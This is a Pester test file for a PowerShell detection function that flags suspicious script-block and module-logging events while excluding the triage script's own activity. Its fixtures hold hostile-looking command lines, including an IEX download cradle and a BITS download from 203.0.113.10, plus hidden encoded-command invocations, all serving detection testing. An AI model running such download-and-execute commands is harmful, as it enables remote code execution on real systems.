# Section 4: suspicious PowerShell in the Operational log (events 4103/4104).
# Covers the v3.3 fix: v3.2's filters matched every real event, so the check
# could never fire. These tests must pass in both directions: the check fires
# on malicious activity, and it does not fire on SecureTriage's own logging.

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
}

Describe 'Select-SuspiciousPSEvent' {

    Context 'fires on suspicious activity (v3.2 never did)' {

        It 'flags Invoke-Expression in an interactive 4104 event' {
            $ev = New-TestEvent4104 -ScriptBlockText "Invoke-Expression 'Write-Output hotfix-test'"
            $result = @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1')
            $result | Should -HaveCount 1
            $result[0].EventId | Should -Be 4104
            $result[0].Snippet | Should -Be "Invoke-Expression 'Write-Output hotfix-test'"
        }

        It 'flags a download cradle from an unknown script file' {
            $ev = New-TestEvent4104 -ScriptBlockText "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')" `
                                    -Path 'C:\Users\Public\update.ps1'
            $result = @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1')
            $result | Should -HaveCount 1
            $result[0].Source | Should -Be 'C:\Users\Public\update.ps1'
        }

        It 'flags a 4103 event whose host command line uses -enc' {
            $ev = New-TestEvent4103 -HostApplication 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' `
                                    -Payload 'CommandInvocation(Write-Output): "Write-Output"'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 1
        }

        It 'still fires when the event Message has the real Windows wording' {
            # Regression guard for v3.2: these Message values contain
            # "Creating Scriptblock text" and "Shell ID = Microsoft.PowerShell",
            # the strings that made v3.2 drop every event.
            $events = @(
                New-TestEvent4104 -ScriptBlockText 'Start-BitsTransfer -Source http://203.0.113.10/x.exe -Destination $env:TEMP\x.exe'
                New-TestEvent4103 -HostApplication 'powershell.exe -EncodedCommand SQBFAFgA' -Payload 'x'
            )
            $events[0].Message | Should -Match 'Creating Scriptblock text'
            $events[1].Message | Should -Match 'Shell ID = Microsoft\.PowerShell'
            @(Select-SuspiciousPSEvent -Events $events -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 2
        }

        It 'does not exclude a script just because its text mentions SecureTriage' {
            # Exclusion is by source file name only. An attacker writing
            # "SecureTriage" into their command must still be caught.
            $ev = New-TestEvent4104 -ScriptBlockText "# SecureTriage`nInvoke-Expression `$payload" `
                                    -Path 'C:\Windows\Temp\run.ps1'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 1
        }
    }

    Context 'does not fire on its own logging' {

        It 'excludes events from this run of the script' {
            $ev = New-TestEvent4104 -ScriptBlockText 'Invoke-Expression and DownloadString appear in this script source' `
                                    -Path 'C:\ProgramData\CentraStage\Packages\abc\SecureTriage.ps1'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 0
        }

        It 'excludes earlier runs saved under a different SecureTriage file name' {
            $ev = New-TestEvent4104 -ScriptBlockText 'Invoke-Expression' -Path 'C:\tools\SecureTriage-v3.3.ps1'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 0
        }

        It 'excludes a renamed copy when its name is passed as SelfLeaf' {
            $ev = New-TestEvent4104 -ScriptBlockText 'Invoke-Expression' -Path 'C:\Windows\Temp\component.ps1'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'component.ps1') | Should -HaveCount 0
        }

        It 'excludes 4103 events whose Script Name is this script' {
            $ev = New-TestEvent4103 -HostApplication 'powershell.exe -NoProfile -File C:\tools\SecureTriage.ps1' `
                                    -ScriptName 'C:\tools\SecureTriage.ps1' `
                                    -Payload 'CommandInvocation(Get-WinEvent): "Get-WinEvent" -EncodedCommand'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 0
        }
    }

    Context 'benign and edge-case input' {

        It 'ignores ordinary administrative commands' {
            $events = @(
                New-TestEvent4104 -ScriptBlockText 'Get-Service | Where-Object Status -eq Running'
                New-TestEvent4104 -ScriptBlockText 'Get-ChildItem C:\Users -Recurse | Out-File report.txt'
            )
            @(Select-SuspiciousPSEvent -Events $events -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 0
        }

        It 'does not treat a short -enc argument as an encoded command' {
            $ev = New-TestEvent4104 -ScriptBlockText 'Get-Content file.txt -enc UTF8'
            @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 0
        }

        It 'returns nothing for no events' {
            @(Select-SuspiciousPSEvent -Events @() -SelfLeaf 'SecureTriage.ps1') | Should -HaveCount 0
        }

        It 'reports no source for an interactive 4103 event with an empty Script Name' {
            # v3.3 captured the next context line ("Command Path =") as the source.
            $ev = New-TestEvent4103 -HostApplication 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' -ScriptName ''
            $result = @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1')
            $result | Should -HaveCount 1
            $result[0].Source | Should -Be ''
        }

        It 'does not throw on characters that are illegal in Windows paths' {
            $ev = New-TestEvent4104 -ScriptBlockText 'Invoke-Expression' -Path 'C:\a<b>|"c?.ps1'
            { Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1' } | Should -Not -Throw
        }

        It 'truncates the snippet to 200 characters' {
            $ev = New-TestEvent4104 -ScriptBlockText ('Invoke-Expression ' + ('A' * 500))
            $result = @(Select-SuspiciousPSEvent -Events $ev -SelfLeaf 'SecureTriage.ps1')
            $result[0].Snippet.Length | Should -Be 200
        }
    }
}
